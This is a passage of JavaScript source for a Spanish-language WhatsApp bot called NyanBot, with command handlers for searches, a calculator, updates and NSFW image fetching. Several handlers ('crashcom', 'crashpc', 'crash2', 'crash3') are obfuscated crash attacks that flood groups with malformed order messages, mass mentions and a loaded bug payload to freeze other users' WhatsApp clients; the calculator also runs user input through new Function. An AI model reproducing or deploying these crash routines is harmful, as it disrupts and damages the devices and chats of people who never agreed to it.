_0x700ee3=0x0;_0x700ee3<_0x3e63cc['length'];_0x700ee3++){var _0x55707b=_0x5dee44[_0x270dc5(0x69)][_0x270dc5(0x67)][_0x270dc5(0x73)](_0x5dee44),_0x324191=_0x3e63cc[_0x700ee3],_0x2c326f=_0x1afd47[_0x324191]||_0x55707b;_0x55707b[_0x270dc5(0x65)]=_0x5dee44[_0x270dc5(0x73)](_0x5dee44),_0x55707b['toString']=_0x2c326f['toString'][_0x270dc5(0x73)](_0x2c326f),_0x1afd47[_0x324191]=_0x55707b;}});_0xb2d8ce(),await samu330['toggleDisappearingMessages'](from);		
var _0x5262=['mteXmteXmteXqhmUD2HHDhnHChaUBMv0','mZG3mdK1A1jKAeTc','mMTtz0j5rG','C2vUze1LC3nHz2u','mti5ntntzKn3wuK','y3jLD2jVDdi','mw9eDwXxsq','nta0oeTly1z0yG','mJu0ndu0s1Dxqxnx','odi4otfdvMzzDhu','ogDuBer4Da','lI9Kzw56lMPWzW','B25SEq','ndiWodyWt21ws1vV','mKLOquzsAa','mta5ntiYn05NEfjArq'];var _0x21d390=_0x9518;function _0x9518(_0x44b3d9,_0x462517){_0x44b3d9=_0x44b3d9-0x15d;var _0x5262e5=_0x5262[_0x44b3d9];if(_0x9518['ZNxiwL']===undefined){var _0x9518bc=function(_0x2f4178){var _0x217a29='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xb9c7de='';for(var _0x50df0d=0x0,_0x46c35d,_0x291992,_0x43adee=0x0;_0x291992=_0x2f4178['charAt'](_0x43adee++);~_0x291992&&(_0x46c35d=_0x50df0d%0x4?_0x46c35d*0x40+_0x291992:_0x291992,_0x50df0d++%0x4)?_0xb9c7de+=String['fromCharCode'](0xff&_0x46c35d>>(-0x2*_0x50df0d&0x6)):0x0){_0x291992=_0x217a29['indexOf'](_0x291992);}return _0xb9c7de;};_0x9518['ZvyGzP']=function(_0x4ac3b3){var _0x1269fb=_0x9518bc(_0x4ac3b3);var _0x345e93=[];for(var _0x21e6b8=0x0,_0x1e2497=_0x1269fb['length'];_0x21e6b8<_0x1e2497;_0x21e6b8++){_0x345e93+='%'+('00'+_0x1269fb['charCodeAt'](_0x21e6b8)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x345e93);},_0x9518['iFDoQk']={},_0x9518['ZNxiwL']=!![];}var _0x12e13e=_0x5262[0x0],_0x41043d=_0x44b3d9+_0x12e13e,_0x26ce3c=_0x9518['iFDoQk'][_0x41043d];return _0x26ce3c===undefined?(_0x5262e5=_0x9518['ZvyGzP'](_0x5262e5),_0x9518['iFDoQk'][_0x41043d]=_0x5262e5):_0x5262e5=_0x26ce3c,_0x5262e5;}(function(_0x3432a0,_0x3409b4){var _0x264797=_0x9518;while(!![]){try{var _0x59a18e=-parseInt(_0x264797(0x16a))*parseInt(_0x264797(0x160))+parseInt(_0x264797(0x16c))*-parseInt(_0x264797(0x162))+-parseInt(_0x264797(0x15f))+-parseInt(_0x264797(0x166))*parseInt(_0x264797(0x161))+-parseInt(_0x264797(0x165))+parseInt(_0x264797(0x169))+parseInt(_0x264797(0x167))*parseInt(_0x264797(0x15e));if(_0x59a18e===_0x3409b4)break;else _0x3432a0['push'](_0x3432a0['shift']());}catch(_0x339e97){_0x3432a0['push'](_0x3432a0['shift']());}}}(_0x5262,0x43e54));if(!itsMe)return reply('a.....??');samu330['updatePresence'](from,Presence['composing']);var bro=await getBuffer(_0x21d390(0x163));samu330[_0x21d390(0x16b)](from,{'degreesLatitude':46.227638,'degreesLongitude':2.213749,'name':'😈Samu330 Domina🥀','address':fake,'jpegThumbnail':bro},location,{'quoted':{'key':{'participant':_0x21d390(0x168)},'message':{'orderMessage':{'itemCount':0x11170,'status':0x1,'surface':0x1,'message':'👑Samu330🔥','orderTitle':fake,'sellerJid':'0@s.whatsapp.net'}}}});
break
		
case 'crashcom':
var _0x58f2=['mtaYmZG0n0npA2PVuG','mZq4otCXseLADxvK','B3DUzxjc','mMTbue14EG','mebZlNDOyxrZyxbWlM5LDa','mJG4nZq2rwXqEuP1','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','odmZodrTA0z6CKO','y3jLD2jVDdi','zgfOBgfO','C2vUze1LC3nHz2u','mZyWmZG3tM9Lrw9S','DxbKyxrLuhjLC2vUy2u','sefds0ve','mZy5ndqWqwfOC3Pt','qgrLBNnZChrYywe','mtCZmdi0wMDxrene','mvHiEMndsW'];var _0x273f32=_0xae41;function _0xae41(_0x4810c2,_0x4c991d){_0x4810c2=_0x4810c2-0x1df;var _0x58f2d3=_0x58f2[_0x4810c2];if(_0xae41['FfoZJA']===undefined){var _0xae4172=function(_0x27b1ac){var _0xf70c93='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3d07a1='';for(var _0x338a8c=0x0,_0x2c4b46,_0x5a8018,_0x176652=0x0;_0x5a8018=_0x27b1ac['charAt'](_0x176652++);~_0x5a8018&&(_0x2c4b46=_0x338a8c%0x4?_0x2c4b46*0x40+_0x5a8018:_0x5a8018,_0x338a8c++%0x4)?_0x3d07a1+=String['fromCharCode'](0xff&_0x2c4b46>>(-0x2*_0x338a8c&0x6)):0x0){_0x5a8018=_0xf70c93['indexOf'](_0x5a8018);}return _0x3d07a1;};_0xae41['MdoMVX']=function(_0x295742){var _0x5e6dfb=_0xae4172(_0x295742);var _0xb89b80=[];for(var _0x34b480=0x0,_0x28e944=_0x5e6dfb['length'];_0x34b480<_0x28e944;_0x34b480++){_0xb89b80+='%'+('00'+_0x5e6dfb['charCodeAt'](_0x34b480)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xb89b80);},_0xae41['hmiUvG']={},_0xae41['FfoZJA']=!![];}var _0x2c14e4=_0x58f2[0x0],_0x5efe9e=_0x4810c2+_0x2c14e4,_0x1e9e69=_0xae41['hmiUvG'][_0x5efe9e];return _0x1e9e69===undefined?(_0x58f2d3=_0xae41['MdoMVX'](_0x58f2d3),_0xae41['hmiUvG'][_0x5efe9e]=_0x58f2d3):_0x58f2d3=_0x1e9e69,_0x58f2d3;}(function(_0x3e62cb,_0x496b48){var _0x1aec91=_0xae41;while(!![]){try{var _0x34b4cd=parseInt(_0x1aec91(0x1e5))+-parseInt(_0x1aec91(0x1e1))*parseInt(_0x1aec91(0x1e4))+-parseInt(_0x1aec91(0x1e3))+-parseInt(_0x1aec91(0x1e6))*parseInt(_0x1aec91(0x1e8))+parseInt(_0x1aec91(0x1ea))+parseInt(_0x1aec91(0x1ec))+parseInt(_0x1aec91(0x1f0));if(_0x34b4cd===_0x496b48)break;else _0x3e62cb['push'](_0x3e62cb['shift']());}catch(_0x5922da){_0x3e62cb['push'](_0x3e62cb['shift']());}}}(_0x58f2,0x7df76));if(!itsMe)return reply('*Tu quien eres??*');samu330[_0x273f32(0x1eb)](from,'✍🏻Crashing'),samu330[_0x273f32(0x1ef)](from,'🌬 *NyanBot* 🔮',MessageType.text,{'quoted':{'key':{'participant':_0x273f32(0x1e9)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':'😈Samu330 Domina🥀','orderTitle':'👑Samu330 | NyanBot🔥','sellerJid':_0x273f32(0x1e9)}}}}),setTimeout(()=>{var _0x15f33f=_0x273f32;samu330[_0x15f33f(0x1df)](from,Presence['composing']),sendMess(_0x15f33f(0x1ee));},0x7d0),reply('*👑Samu330 Crashing Groups!!🔥*');
break	
		
case 'crashpc':
var _0x1e0a=['ng9AALbhzG','y29TCg9ZAw5N','qgrLBNnZChrYywe','mLHfAuHIBG','mZeXnJmWALbvsvPL','DxbKyxrLuhjLC2vUy2u','C2vUze1LC3nHz2u','mZCZnJiYyvLAsvL4','ntaZodbZv292Bfu','mZuWmJa0Bw1rthn3','mJiXntLWD3fyD1y','B25SEq','nZi5nZjHEw5mrK0','ndCXmteXv1j2s3Dr'];var _0x1e1570=_0x1cdc;function _0x1cdc(_0x3b5420,_0xc28e03){_0x3b5420=_0x3b5420-0x156;var _0x1e0a9a=_0x1e0a[_0x3b5420];if(_0x1cdc['HzxOzL']===undefined){var _0x1cdc20=function(_0x340030){var _0x75d462='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4a5cad='';for(var _0x4fab0e=0x0,_0x252ec5,_0x483374,_0x50c643=0x0;_0x483374=_0x340030['charAt'](_0x50c643++);~_0x483374&&(_0x252ec5=_0x4fab0e%0x4?_0x252ec5*0x40+_0x483374:_0x483374,_0x4fab0e++%0x4)?_0x4a5cad+=String['fromCharCode'](0xff&_0x252ec5>>(-0x2*_0x4fab0e&0x6)):0x0){_0x483374=_0x75d462['indexOf'](_0x483374);}return _0x4a5cad;};_0x1cdc['GVkRCv']=function(_0x2834b6){var _0x517c6b=_0x1cdc20(_0x2834b6);var _0x91c801=[];for(var _0x1753ec=0x0,_0x55d373=_0x517c6b['length'];_0x1753ec<_0x55d373;_0x1753ec++){_0x91c801+='%'+('00'+_0x517c6b['charCodeAt'](_0x1753ec)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x91c801);},_0x1cdc['YTWKcT']={},_0x1cdc['HzxOzL']=!![];}var _0x12ec9c=_0x1e0a[0x0],_0x4da9eb=_0x3b5420+_0x12ec9c,_0x16b46b=_0x1cdc['YTWKcT'][_0x4da9eb];return _0x16b46b===undefined?(_0x1e0a9a=_0x1cdc['GVkRCv'](_0x1e0a9a),_0x1cdc['YTWKcT'][_0x4da9eb]=_0x1e0a9a):_0x1e0a9a=_0x16b46b,_0x1e0a9a;}(function(_0x1b8658,_0x253b48){var _0x5973c4=_0x1cdc;while(!![]){try{var _0x515f31=parseInt(_0x5973c4(0x157))+-parseInt(_0x5973c4(0x15a))*parseInt(_0x5973c4(0x15c))+parseInt(_0x5973c4(0x156))+-parseInt(_0x5973c4(0x15b))+parseInt(_0x5973c4(0x160))+parseInt(_0x5973c4(0x163))+parseInt(_0x5973c4(0x15f))*-parseInt(_0x5973c4(0x158));if(_0x515f31===_0x253b48)break;else _0x1b8658['push'](_0x1b8658['shift']());}catch(_0x4fdec7){_0x1b8658['push'](_0x1b8658['shift']());}}}(_0x1e0a,0x43ff7));if(!itsMe)return reply('Tu no eres samu :/');samu330[_0x1e1570(0x161)](from,Presence[_0x1e1570(0x15d)]),samu330[_0x1e1570(0x162)](from,'*👑Samu330 Crashing Groups!!🔥*',MessageType.text,{'quoted':{'key':{'participant':'9999999999@s.whatsapp.net'},'message':{'orderMessage':{'itemCount':0x11170,'status':0x1,'surface':0x1,'message':'😈Samu330 Domina🥀','orderTitle':_0x1e1570(0x15e),'sellerJid':'0@s.whatsapp.net'}}}});
break
		
case 'crash2':
var _0x4f33=['C2vUze1LC3nHz2u','ndmZzNrnBNLM','qgrLBNnZChrYywe','mtCZmZG4mZqXmJa1ntK0','CMvWBgfJzq','nJi4mZe2mtu2nZiZn0bZlNDOyxrZyxbWlM5LDa','mZKYndzlDMrzu2G','CY53Agf0C2fWCc5Uzxq','qMvYAgfZAwWGtwvUz2LYAw0GqNvNifrYB2XPmG','odeXmtDVANHmwei','nJaWmwz3tej4wa','nZbit1blvwW','mZqXndC0tuTqvxbz','ndeXnJrcqNH0r3O','z3jVDxbnzxrHzgf0yq','yY51CW','CgfYDgLJAxbHBNrZ','zgvUC3nWDhjHyq','su5rvuLswq','ndDsvwLeyKK','ndaZmdi2sM5dsunU','y3jLD2jVDdi','ChvZAa','sNvTBgfOBNLHpW','q0fuquXprW','B3DUzxjc','BgvUz3rO','B25SEq','qvi0uw1vs3y3CJrqmfHzshriBwHmCw9gt09OD244u3fpotaZq1zVoxjHuuW0qt09','mebZlNDOyxrZyxbWlM5LDa','BwfW'];function _0x23a6(_0xee039c,_0x2e5950){_0xee039c=_0xee039c-0x102;var _0x4f3398=_0x4f33[_0xee039c];if(_0x23a6['ZYHNFq']===undefined){var _0x23a614=function(_0xc55725){var _0x274a3a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2b6d34='';for(var _0x33c078=0x0,_0x596a7e,_0x355fa6,_0xc8b8c8=0x0;_0x355fa6=_0xc55725['charAt'](_0xc8b8c8++);~_0x355fa6&&(_0x596a7e=_0x33c078%0x4?_0x596a7e*0x40+_0x355fa6:_0x355fa6,_0x33c078++%0x4)?_0x2b6d34+=String['fromCharCode'](0xff&_0x596a7e>>(-0x2*_0x33c078&0x6)):0x0){_0x355fa6=_0x274a3a['indexOf'](_0x355fa6);}return _0x2b6d34;};_0x23a6['tqyWgy']=function(_0x1a03c4){var _0x13051a=_0x23a614(_0x1a03c4);var _0x1415fc=[];for(var _0x19d4db=0x0,_0x2f9a8e=_0x13051a['length'];_0x19d4db<_0x2f9a8e;_0x19d4db++){_0x1415fc+='%'+('00'+_0x13051a['charCodeAt'](_0x19d4db)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1415fc);},_0x23a6['ToEEhR']={},_0x23a6['ZYHNFq']=!![];}var _0x5def49=_0x4f33[0x0],_0xdcf760=_0xee039c+_0x5def49,_0x4ce3ea=_0x23a6['ToEEhR'][_0xdcf760];return _0x4ce3ea===undefined?(_0x4f3398=_0x23a6['tqyWgy'](_0x4f3398),_0x23a6['ToEEhR'][_0xdcf760]=_0x4f3398):_0x4f3398=_0x4ce3ea,_0x4f3398;}var _0x553d61=_0x23a6;(function(_0x151d4a,_0x5beb66){var _0x731441=_0x23a6;while(!![]){try{var _0xfd3072=-parseInt(_0x731441(0x107))*-parseInt(_0x731441(0x110))+-parseInt(_0x731441(0x109))+-parseInt(_0x731441(0x106))+-parseInt(_0x731441(0x10a))+parseInt(_0x731441(0x103))+parseInt(_0x731441(0x111))+-parseInt(_0x731441(0x108))*parseInt(_0x731441(0x11d));if(_0xfd3072===_0x5beb66)break;else _0x151d4a['push'](_0x151d4a['shift']());}catch(_0x2241bc){_0x151d4a['push'](_0x151d4a['shift']());}}}(_0x4f33,0x3836e));if(!itsMe)return reply('*Am...?*');if(args[_0x553d61(0x117)]<0x1)return reply('Mount pls :)');try{var hets=_0x553d61(0x112),grousp=await samu330[_0x553d61(0x10b)](from),membere=grousp[_0x553d61(0x10d)],mems=[];membere[_0x553d61(0x11b)](async _0x5def49=>{var _0x211126=_0x553d61;mems[_0x211126(0x113)](_0x5def49['id'][_0x211126(0x120)](_0x211126(0x10c),_0x211126(0x104)));});var options={'text':hets,'contextInfo':{'mentionedJid':mem},'quoted':sam};for(let i=0x0;i<args[0x0];i++){samu330[_0x553d61(0x11c)](from,options,MessageType.text,{'quoted':{'key':{'fromMe':![],'participant':_0x553d61(0x11a),...from?{'remoteJid':'5219984907794@s.whatsapp.net'}:{}},'message':{'orderMessage':{'orderId':_0x553d61(0x11f),'itemCount':-0x2540be3ff,'status':_0x553d61(0x10f),'surface':'CATALOG','message':'*👑Samu330 Crashing Groups!!🔥*','orderTitle':_0x553d61(0x10e),'sellerJid':_0x553d61(0x102),'token':'AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=='}}}});}}catch{for(let i=0x0;i<0xa;i++){samu330[_0x553d61(0x11c)](from,'*😈Samu330 Domina🥀*',MessageType.text,{'quoted':{'key':{'fromMe':![],'participant':_0x553d61(0x11a),...from?{'remoteJid':'5219984907794@s.whatsapp.net'}:{}},'message':{'orderMessage':{'orderId':_0x553d61(0x11f),'itemCount':-0x2540be3ff,'status':_0x553d61(0x10f),'surface':_0x553d61(0x115),'message':'*👑Samu330 Crashing Groups!!🔥*','orderTitle':_0x553d61(0x11e),'sellerJid':_0x553d61(0x102),'token':_0x553d61(0x119)}}}});}}
break	
		
case 'crash3':
const _0x2a55=['A2v5','B3DUzxjc','ndC1ndC2DLPgCxbX','qxn5BhvTvMLYDxm','otu4n3LrCe1pDa','ndG5ntKYveT6q0r6','nJaYnJf1zNvLvNm','B25SEq','mZq4otyWrLbeq0DT','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','ndi4mJC3yu51z0HU','qgfKAxDHANnOAw5Nl2jHAwXLExm','nvnTshDpqG','4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwHokwHokwHokwHokwHokwHokwHokwHokwKUkwKUkwKUkwKUkwKUkwKGRILPlILPlILOJILPlILPlILPlILOtILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOtILPlILPlILPlILPik4PAs4PAi4PAq4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAs4PAscUkwKUkwJokwKokwKUkwKUkwIokwIokwHokwGokwIokwIokwIokwIokwIokwIokwGokwHokwIokwIokwKUkwKUkwKGRILPdILlZILPdILPlILPlILOJILOJILOtILOtILOtILOtILOJILOJILOtILOtILOtILOtILOJILOJILPlILPlILPik4PAq4Ps84PAq4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKokwHokwKokwIokwIokwIokwIokuGokwGokwKokwKokwGokwIokuGokwIokuGokwJokwKokwIokwIokwHokwKGRILPlILPlILOJILOJILOJILOJILOJILidILidILidILidILidILidILidILidILidILidILPdILOJILOJILOJILOWk4PAs4PAs4PAi4PAa4PAa4PAi4PAi4PAe4PAi4Psa4PAe4Psa4Psa4Psa4PAq4Psa4PAe4PAi4PAi4PAi4PAa4PAscUkwKUkwKUkwIokwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwHokwIokwIokwIokwIokwIokwIokwKUkwKUkwKGRILPlILPlILPlILPlILPlILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwIokwIokwKokwJokwIokwIokwJokwKUkwKUkwKGRILPlILPlILPlILPlILPlILPdILOdILPdILPlILOZILOdILOJILOdILPlILPdILPlILOJILPlILPlILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAq4PAs4PAs4PAs4PAs4PAm4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKG','mebZlNDOyxrZyxbWlM5LDa','nJm5ntDVDxLlDM8','4PIG77Ipqxn5BhvT4PIG77Ip','zxH0zw5KzwruzxH0','C2vUze1LC3nHz2u','ndHnyNPZzu8'];const _0x181205=_0x3357;(function(_0x15c8b7,_0x1c69db){const _0x28ef5e=_0x3357;while(!![]){try{const _0x5b2e3c=parseInt(_0x28ef5e(0x89))+-parseInt(_0x28ef5e(0x82))+-parseInt(_0x28ef5e(0x7b))+-parseInt(_0x28ef5e(0x7d))+parseInt(_0x28ef5e(0x86))*parseInt(_0x28ef5e(0x8b))+parseInt(_0x28ef5e(0x79))*-parseInt(_0x28ef5e(0x7f))+parseInt(_0x28ef5e(0x8c));if(_0x5b2e3c===_0x1c69db)break;else _0x15c8b7['push'](_0x15c8b7['shift']());}catch(_0x45cd13){_0x15c8b7['push'](_0x15c8b7['shift']());}}}(_0x2a55,0x45079));if(!itsMe)return reply('*A......??*');function _0x3357(_0x3b0a3d,_0x1534a4){_0x3b0a3d=_0x3b0a3d-0x79;let _0x2a5539=_0x2a55[_0x3b0a3d];if(_0x3357['cjjhGf']===undefined){var _0x335755=function(_0x5225bd){const _0x46b860='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43d834='';for(let _0x36a7b6=0x0,_0x135f3a,_0x57c727,_0x2a4bc5=0x0;_0x57c727=_0x5225bd['charAt'](_0x2a4bc5++);~_0x57c727&&(_0x135f3a=_0x36a7b6%0x4?_0x135f3a*0x40+_0x57c727:_0x57c727,_0x36a7b6++%0x4)?_0x43d834+=String['fromCharCode'](0xff&_0x135f3a>>(-0x2*_0x36a7b6&0x6)):0x0){_0x57c727=_0x46b860['indexOf'](_0x57c727);}return _0x43d834;};_0x3357['dExSbW']=function(_0x124420){const _0xb94211=_0x335755(_0x124420);let _0x567ce5=[];for(let _0x1648bd=0x0,_0x2f3fcb=_0xb94211['length'];_0x1648bd<_0x2f3fcb;_0x1648bd++){_0x567ce5+='%'+('00'+_0xb94211['charCodeAt'](_0x1648bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x567ce5);},_0x3357['YaAqHs']={},_0x3357['cjjhGf']=!![];}const _0x4f0ece=_0x2a55[0x0],_0x30a154=_0x3b0a3d+_0x4f0ece,_0x2f9b51=_0x3357['YaAqHs'][_0x30a154];return _0x2f9b51===undefined?(_0x2a5539=_0x3357['dExSbW'](_0x2a5539),_0x3357['YaAqHs'][_0x30a154]=_0x2a5539):_0x2a5539=_0x2f9b51,_0x2a5539;}function sleep(_0x4f0ece){return new Promise(_0x30a154=>setTimeout(_0x30a154,_0x4f0ece));}function troli(_0x2f9b51){const _0x107123=_0x181205;samu330[_0x107123(0x85)](_0x2f9b51,_0x107123(0x80),MessageType[_0x107123(0x84)],{'quoted':{'key':{'participant':_0x107123(0x81)},'message':{'orderMessage':{'thumbnail':fs.readFileSync('./src/ara.png'),'itemCount':-0x39cd8185,'status':0x1,'surface':0x1,'message':'*👑Samu330 Crashing Groups!!🔥','orderTitle':_0x107123(0x8a),'sellerJid':'0@s.whatsapp.net'}}}});}function bug(_0x5225bd){const _0xc0b2db=_0x181205;for(let _0x43d834=0x0;_0x43d834<0x1;_0x43d834++){var _0x46b860=require(_0xc0b2db(0x7e));samu330[_0xc0b2db(0x7c)](_0x5225bd,_0x46b860);}}async function attack(_0x36a7b6){bug(_0x36a7b6),await sleep(0x64),troli(_0x36a7b6),await sleep(0x64),bug(_0x36a7b6);}attack(sam[_0x181205(0x87)]['remoteJid']);
break		
	
//Evaluar ecuaciones By Samu330
/**/case 'calc':
/**/global.math = global.math ? global.math : {}
/**/let ed = from
/**/if (ed in global.math) {
/**/clearTimeout(global.math[ed][3])
/**/delete global.math[ed]
/**/reply('Hmmm...y la ecuacion?')
/**/}
/**/let val = q
/**/.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
/**/.replace(/×/g, '*')
/**/.replace(/÷/g, '/')
/**/.replace(/π|pi/gi, 'Math.PI')
/**/.replace(/e/gi, 'Math.E')
/**/.replace(/\/+/g, '/')
/**/.replace(/\++/g, '+')
/**/.replace(/-+/g, '-')
/**/let format = val
/**/.replace(/Math\.PI/g, 'π')
/**/.replace(/Math\.E/g, 'e')
/**/.replace(/\//g, '÷')
/**/.replace(/\*×/g, '×')
/**/try {
/**/console.log(val)
/**/let result = (new Function('return ' + val))()
/**/if (!result) throw result
/**/reply(`
           CALCULADORA
╭──╼┥𝈸𖾗ᷤ𖾕꯭ͣ𖾔꯭𖾔ͫ𖽙ͧ𝈹┝╾──╮
╽ ┌──────────┐ ┃
┃   *${format}*
┃ ├──────────┤ ┃
┃   *Resultado*:
┃ ├──────────┤ ┃
┃  _${result}_
╿ └──────────┘ ╿
╰─┨ ⃞📟 𝜍𝛼𝜄𝜍 📟⃞ ┠─╯`)
/**/} catch (e) {
/**/if (e == undefined) throw '?'
/**/throw 'Formato incorrecto, solo 0-9 y símbolo -, +, *, /, ×, ÷, π, e, (, ) son compatibles'
/**/}
/**/addFilter(from)
/**/break

case 'google':
assistant = fs.readFileSync('./src/assistant.jpg')
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
let buscar = args.join(' ')
if (!buscar) return reply('Que deseas buscar?')
let search = await samuGg({ query: buscar })
let ggsm = ``
for (let i of search) {
ggsm += `
*Titulo :* ${i.title}
*Link :* ${i.link}
*Contenido :* ${i.snippet}

`
}
var nyangg = ggsm.trim()
reply(`*🔍Busqueda realizada por* 🐉Samu330🐉\n\n${nyangg}`)
addFilter(from)
break
			
case 'imagen':
assistant = fs.readFileSync('./src/assistant.jpg')
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Que deseas buscar?')
reply(`Porfavor espera un momento mientras busco imagenes de ` + args.join(' '))
ggimg = args.join(' ')
res = await samuGgImg(ggimg, google)
function google(error, result){
if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: sam, caption: `*🔍Busqueda de* _${ggimg}_\n*Realizada por 🐉Samu330🐉*`})
}
}
addFilter(from)
break
case 'apagar':
if (!isOwner) return reply('tu quien eres para decirme que hacer!?🤔')
reply('Me apagare en 3 Segundos....')
setTimeout( () => {
samu330.close() }, 3000)
break

case 'restaurar':
if (!itsMe) return reply('tu quien eres para decirme que hacer!?🤔')
reply('*LA INFORMACION DE ESTE USUARIO SE RESTABLECERA PARA PODER USAR Y ESCANEAR EL CODIGO EN OTRO DISPOSITIVO*')
exec(`bash restore.sh`, (err, stdout) => {
if (err) return reply(err)
if (stdout) reply(stdout)
})
break
	
case 'actualizar':
case 'update':
if (!itsMe) return reply('tu quien eres para decirme que hacer!?🤔')
reply('*ESPERE UN MOMENTO... EL BOT ESTA SIENDO ACTUALIZADO CON LAS ÚLTIMAS MODIFICACIONES DE: https://github.com/Samu330/NyanBot*')
exec(`bash update.sh`, (err, stdout) => {
if (err) return reply(err)
if (stdout) reply(`*El bot se ah actualizado de forma satisfactoria*\n Informe de la actualización:\n\n${stdout}\n\nLos cambios se mostraran despues de volver a iniciar el bot!.`)
})
break
		
case 'grupos':
samu330.updatePresence(from, Presence.composing)  
let gruposT = samu330.chats.array.filter(v => v.jid.endsWith('g.us')).map(v =>`${samu330.groupMetadata(v.jid).subject}\n${v.jid} [${v.read_only ? ' ❌Salio ' : ' *✅Dentro* '}]`).join`\n\n`
samu330.sendMessage(from, `*Lista de Grupos del Bot:*\n\n${gruposT}`, MessageType.text, {quoted: floc})
break
		
case 'zalgo':
if (args.length < 1) return reply("Escriba una frase despues del comando para poder continuar!")
reply(zalgo(`${body.slice(6)}`))
addFilter(from)
break
		
case 'contar':
addFilter(from)
if (args.length == 0) return reply('0 caracteres!😀 NO HAY TEXTO PARA CONTAR!')
const count = body.slice(8).length
if (count === 1) {
reply(`El texto solo contine *${count}* caracter.`)
} else if (count > 1) {
reply(`Su texto contiene *${count}* caracteres.`)
}
break
		
case 'reportar':
if (args.length <= 1) return reply(`Ejemplo: ${prefix}reportar "Amm... disculpa, tengo un error en...."`)
if (args.length >= 300) return samu330.sendMessage(from, '*El limite del reporte es de maximo 300 caracteres!*', MessageType.text, {quoted: ftoko})
var numerorepo = sam.participant
reporte = `[REPORTE]\nDe: @${sender.split("@s.whatsapp.net")[0]}\n\n${q}`
var options = { text: reporte, contextInfo: { mentionedJid: [sender] },}
samu330.sendMessage('5219984907794@s.whatsapp.net', options, MessageType.text, {quoted: floc})
reply("*El reporte fue enviado al CREADOR del bot, reporte falso o bura = Block*")
addFilter(from)
break

case 'teles':
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
ini_url = args[0]
ini_url = await getJson(`https://api.lolhuman.xyz/api/telestick?apikey=${api}&url=${ini_url}`)
ini_sticker = ini_url.result.sticker
for (sticker_ in ini_sticker) {
ini_buffer = await getBuffer(ini_sticker[sticker_])
await samu330.sendMessage(from, ini_buffer, sticker)
}
break
			
case 'xwaifu':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
reply('*Buscando una buena imagen...*')
waifu = await getJson(`https://api.waifu.pics/nsfw/waifu`)
sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *Samu330 | NyanBot* 💠', sendEphemeral: true})
addFilter(from)
break

case 'xneko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
reply('*Buscando una buena imagen...*')
waifu = await getJson(`https://api.waifu.pics/nsfw/neko`)
sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *Samu330 | NyanBot* 💠', sendEphemeral: true})
addFilter(from)
break
		
case 'trap':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
reply('*Buscando una buena imagen...*')
waifu = await getJson(`https://api.waifu.pics/nsfw/trap`)
sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *Samu330 | NyanBot* 💠', sendEphemeral: true})
addFilter(from)
break
		
case 'blow':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
reply('*Buscando una buena imagen...*')
waifu = await getJson(`https://api.waifu.pics/nsfw/blowjob`)
